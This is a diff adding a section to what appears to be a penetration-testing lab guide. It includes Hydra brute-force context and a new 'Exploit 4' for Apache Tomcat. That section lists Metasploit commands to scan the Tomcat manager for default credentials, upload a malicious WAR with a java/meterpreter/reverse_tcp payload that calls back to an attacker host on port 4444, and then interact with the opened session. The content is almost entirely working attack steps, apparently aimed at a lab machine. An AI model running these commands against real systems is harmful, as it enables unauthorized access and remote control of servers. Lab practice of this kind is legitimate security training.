@@ -175,3 +175,26 @@ failed" \
 7. -V -t 4
 8. Observe valid credentials when Hydra reports [80][http-post-form] host: ...
 login: ... password: ....
+
+3.4 Exploit 4 — Tomcat manager: credential scan + WAR
+upload (if Tomcat present)
+When to use: nmap shows Tomcat (8180 or 8080) and manager application reachable.
+1. Scanner for default credentials:
+use auxiliary/scanner/http/tomcat_mgr_login
+set RHOSTS 192.168.56.106
+set RPORT 8180 # adjust if 8080
+run
+2. If credentials found, deploy WAR using msf module:
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS 192.168.56.106
+set RPORT 8180
+set HttpUsername <found_user>
+set HttpPassword <found_pass>
+set LHOST 192.168.56.104
+set LPORT 4444
+set PAYLOAD java/meterpreter/reverse_tcp
+exploit
+3. If session opens:
+sessions -i <id>
+sysinfo
+Notes: If manager login fails, document scanner output and skip to next exploit.
